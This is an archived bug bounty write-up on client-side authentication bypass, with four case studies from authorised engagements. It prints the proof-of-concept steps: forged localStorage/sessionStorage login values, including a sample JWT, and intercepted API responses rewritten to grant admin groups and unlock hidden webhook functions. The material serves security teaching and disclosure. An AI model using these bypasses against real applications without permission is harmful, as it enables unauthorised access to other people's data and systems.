# Client-side Authentication Bypass

- **Category:** JWT & Session Flaws
- **Publication Date:** 2026-06-14
- **Source Channel:** Bug Bounty Hub
- **Original Source URL:** [https://kuldeep.io/posts/client-side-authentication-bypass/](https://kuldeep.io/posts/client-side-authentication-bypass/)

---

## Detailed Writeup & Technical Breakdown

> Disclaimer
This blog contains human-written content only. The use of AI was limited to grammatical error correction.


Disclaimer


This blog contains human-written content only. The use of AI was limited to grammatical error correction.


## Scenario⌗


You start testing an application and realize it uses a main.js file. In this file, there are hundreds of API endpoints. You visit one endpoint, and it shows data without authentication. You try the same with 10 other endpoints and observe the same behavior. All or most API endpoints are accessible without any authentication.


The question that comes here is, how do you write a report for something like this? Do you create a separate report for each module? For each endpoint? If you send, let’s say, 10 reports for endpoints lacking authentication, the company will probably pay for one report, call it a systemic issue (which it is), and move on. If you create separate reports for separate modules, the company might pay for one module or two, and mark the other reports as systemic. Or the company might only pay for modules where significant information is leaked.


But the question is: how do you report something like this in a way that ensures the company sees the full impact of the vulnerability?


The answer is Client-side Authentication Bypass!


This happens when authentication checks exist only in client-side JavaScript rather than on the server.


Initially, I tried to add different techniques that can be used to protect routes/pages on the frontend. But as I dug through my reports, I realized every app used a different approach. Due to this, I will directly share the case studies.


## Case Studies⌗

- Authentication Bypass Allows Full CRUD Operations Over All Modules
- Authentication Bypass In REDACTED Instance Allowing CRUD Access Over All Modules
- Authentication Bypass in REDACTED Allows READ Access over the Application
- ACPV Allows To Read/Write/Update Webhooks For Inactive User

### 1. Authentication Bypass Allows Full CRUD Operations Over All Modules⌗


This is one of my favorite ones. When we visit https://application/dashboard, we are redirected to a login page. Obviously, because we do not have a valid login.


I analyzed the client-side JS code to find valid routes, API endpoints, etc. I painstakingly constructed many of the API calls, and that revealed a pattern. All of them lacked authentication. I could see all users, clients, projects, resources, and more directly through the API. There were several add/remove/delete API endpoints as well, but it was taking a lot of time to reconstruct the API calls from raw JS code. And all API endpoints I tested so far lacked authentication.


This sparked a thought in me. If I could figure out how the front-end handled authentication, I could probably trick it into believing I was authenticated.


I found the following snippet:


```
path: "/backoffice",
name: "Backoffice",
meta: {
  title: "Backoffice",
  icon: "backoffice",
  authRequired: !0
}
```


Here, the authRequired parameter is set to !0 which simply means true. In simple terms, authentication is required for the /backoffice  path.


Future me could have tried authRequired:0 using Burp Suite’s match and replace rules, but I couldn’t think of this at that time.


I checked how this autheRequired check was performed and came across this:


```
Et.beforeEach((function(t, e, o) {
  t.meta.authRequired
    ? Re.state.auth.isUserLoggedIn()
      ? Re.state.auth.user || Re.dispatch("auth/refreshUser")
      : (
          Et.replace({
            path: "/login",
            query: { to: t.path }
          }),
          Re.dispatch("auth/deleteToken")
        )
    : Re.state.auth.isUserLoggedIn() &&
      (
        Re.dispatch("auth/refreshUser"),
        Et.push("/dashboard")
      ),
  Re.dispatch("app/clearMetadata"),
  e.name && Re.dispatch("app/persistFilter", e.name),
  o()
}))
```


I couldn’t understand all of this, but one thing that caught my eye was the isUserLoggedIn() function.


So, I further analyzed the code to see how that function was working. The analysis led to the following snippet:


```
{
  isUserLoggedIn: function () {
    return (
      new Date(Date.now()) < new Date(localStorage.getItem("tokenExpiry")) &&
      !!localStorage.getItem("token")
    );
  },
  user: null
}
```


Great! So we now know that the application requires the token and tokenExpiry parameters to be set in local storage. I set an example JWT in the token parameter and a random future date in the tokenExpiry parameter and I was logged in!


How did I determine that the application was expecting a JWT in the token parameter? Using this snippet that I came across while searching for “token”:


```
SET_ID: function (t, e) {
    var o = e.split(".")[1],
        a = o.replace("-", "+").replace("_", "/"),
        r = JSON.parse(window.atob(a));

    _.a.defaults.headers.common["x-req-id"] = r._id;
},

SET_TOKEN: function (t, e) {
    var o = e.split(".")[1],
        a = o.replace("-", "+").replace("_", "/"),
        r = JSON.parse(window.atob(a));

    localStorage.setItem("token", e);
    localStorage.setItem("tokenExpiry", new Date(1e3 * r.exp));
}
```


The above code decodes a JWT and sets the necessary values.


The final PoC was this:


```
localStorage.setItem(
    "token",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlclByb2ZpbGUiOnsibmFtZSI6InN1cGVyIHVzZXIifSwicm9sZXMiOiJzdXBlciB1c2VyIiwiaWF0IjoxNTE2MjM5MDIyfQ.2aSywKuq7I_2zNQ9eBtpLNQieItWIiocTiXm53qVLdg"
);

localStorage.setItem(
    "tokenExpiry",
    "2024-12-31T23:59:59Z"
);
```


### 2. Authentication Bypass In REDACTED Instance Allowing CRUD Access Over All Modules⌗


This was also a similar case. I found the API endpoints were accessible without any authentication. And the application also felt vulnerable. So, I checked the JS files and came across this snippet:


```
function init() {
    var storedUserInfo = $window.sessionStorage.getItem('userInfo');
    if (storedUserInfo) {
        userInfo = JSON.parse(storedUserInfo); // Expects a JSON value
    }

    var storedLoggedIn = $window.sessionStorage.getItem('loggedIn');
    if (storedLoggedIn) {
        $rootScope.loggedIn = JSON.parse(storedLoggedIn);
    }
}
```


This code retrieves the user information from the userInfo and loggedIn session storage keys.


I manually set the userInfo parameter to be “synack” and loggedIn to true. However, this didn’t bypass the authentication, and we can quickly see the why. The userInfo value is supposed to contain a JSON object. And because we entered “synack”, it wasn’t valid JSON, and the check failed.


To see what exactly the application expected in the userInfo key, I looked into the JS code and found this snippet:


```
resolve: {
    auth: ['$q', 'authService', function ($q, authService) {
        var userInfo = authService.getUserInfo();

        if (userInfo) { // Only checks if userInfo exists.
            return $q.when(userInfo);
        } else {
            return $q.reject({ authenticated: false });
        }
    }]
}
```


Here, the code only verifies if userInfo exists, and it is not null. It doesn’t perform any validity check on the userInfo object. This meant that we could bypass this check by simply setting the userInfo parameter to be {}. That’s it.


The final authentication bypass looked like this:


```
sessionStorage.setItem(
    "userInfo",
    JSON.stringify({})
);

sessionStorage.setItem(
    "loggedIn",
    JSON.stringify(true)
);
```


### 3. Authentication Bypass in REDACTED Allows READ Access over the Application⌗


This was a HackerOne engagement. I came across this domain, and it gave a login page.


Following my instincts, I tried SQL injection. But it wasn’t there. The login page was secure against it. One thing that caught my eye was a weird pluginId returned in the failed login response:


```
{
  "LoginResult": {
    "PluginId": "<REDACTED>",
    "Status": "The username and/or password supplied are incorrect."
  }
}
```


I didn’t think much of it and proceeded to test other things. I saw the JS files didn’t reveal much. But the login page had this JS snippet in it:


```
if (response.LoginResult.Status !== "ok") {
    mxalert(response.LoginResult.Status);
} else {
    window.PluginId = response.LoginResult.PluginId;
    window.location = "/main.html";
}
```


What this means is that upon successful login, the front-end redirected to the main.html page. The next obvious thought is to directly visit the main.html page and see if it reveals anything.


I visited the page, and I saw a short layout getting loaded, and before it could load, I was brought back to the login page.


I checked Burp Suite logs and found the following request:


```
// Request

POST /api/api.svc/GetSessionInfo HTTP/1.1

// Response

{
  "Groups": null,
  "PluginId": null,
  "UserCanUpdateRunningOrder": false,
  "UserCanUpdateText": false,
  "UserName": null,
  "UserTimeout": 1,
  "UserUrn": 0
}
```


So the application might require these values not to be null to consider me an authenticated user. Here, I noticed the PluginId in the response was null. This is when I remembered the previous plugin ID that was sent in the login response.


For the value of Group I searched the sessionInfo.Groups string in the JS files. That gave me a lot of different values like:

- Administration
- Production Admin
- Publication Admin
- And many other

I used the “Production Admin” value because I saw it first.


I intercepted the response from the /api/api.svc/GetSessionInfo and modified it to be:


```
{
  "Groups": [
    "Production Admin"
  ],
  "PluginId": "<REDACTED>",
  "UserCanUpdateRunningOrder": true,
  "UserCanUpdateText": true,
  "UserName": "Hackerone",
  "UserTimeout": 1000,
  "UserUrn": 10
}
```


Here, only the PluginId and Groups keys have meaningful values. Other values I entered are random.


Even after modifying the response, we were sent back to the login. To see what was wrong, I checked Burp Suite request logs. And this time, we see a new request:


```
// Request

POST /api/api.svc/GetNotifications HTTP/1.1

// Response

{
  "NotificationTitles": [],
  "NotificationUrns": [],
  "ServerDate": "09/08/2025 16:55:30",
  "TimeoutStatus": "Timeout"
}
```


The notification request showed that we had a timeout and the application logged us out. To fix this, I removed the "TimeoutStatus": "Timeout" value entirely from the response. And this was it.


The final exploit required me to add a match-and-replace rule to remove "TimeoutStatus": "Timeout" from the notifications request and modify the session values in the GetSessionInfo request.


This bug alone didn’t pay off well enough, but it allowed me to further enumerate the application, which eventually led to a $4,000 SQL injection in one of the API endpoints.


If you want to learn this exact bug that lead to a $4,000 bounty, I have replicated the entire environment in this Barracks WarZone: Barracks Care Publication


### 4. ACPV Allows To Read/Write/Update Webhooks For Inactive User⌗


This was an authenticated assessment in Synack Red Team. The credentials were provided for an inactive user who has the bare minimum functionality. The user had limited read access to a few functionalities but no write access.


In the application, there was a “webhooks” functionality. The current user could see the webhooks but could not add or edit them because that functionality was hidden in the UI.


After logging in, a request to the following endpoint was sent: /areaprivada/api/payments/dashboard/v1/accounts/me. In a response to this request, there was a huge JSON object. In this JSON object, an is_active key was present. This was set to false.


This confirmed that our user was indeed a bare-minimum privileged user.


What we need to check now is that the user actually has the bare minimum privileges, and any activated user functionalities aren’t accessible. To test this, I simply changed the false to true in the is_active JSON key.


This revealed an “Add Webhook” functionality that wasn’t visible previously. I used it to create webhooks, and they were indeed created.


The takeaway from this case study is that the webhook functionality code was written in the client-side JS files. But analyzing the client-side code would have taken significantly longer than simply changing false to true.


## Conclusion⌗


I hope you had fun reading this and learned something new. If you want to practice the vulnerabilities you learned here, you can head over to https://app.barracks.army/. I have intentionally made vulnerable web applications (called WarZones) for almost all of these vulnerabilities.


One more thing. If you don’t understand the application code very well, you don’t have to get discouraged. AI tools like Claude and ChatGPT do an excellent job of analyzing the code for you. You just have to be dedicated enough to try to understand it.


If you have any doubts or questions, feel free to ping me on my LinkedIn, Twitter, or Instagram.


Happy Hacking!

---
*Archived in Auth Bypass Vault from verified bug bounty community intelligence.*
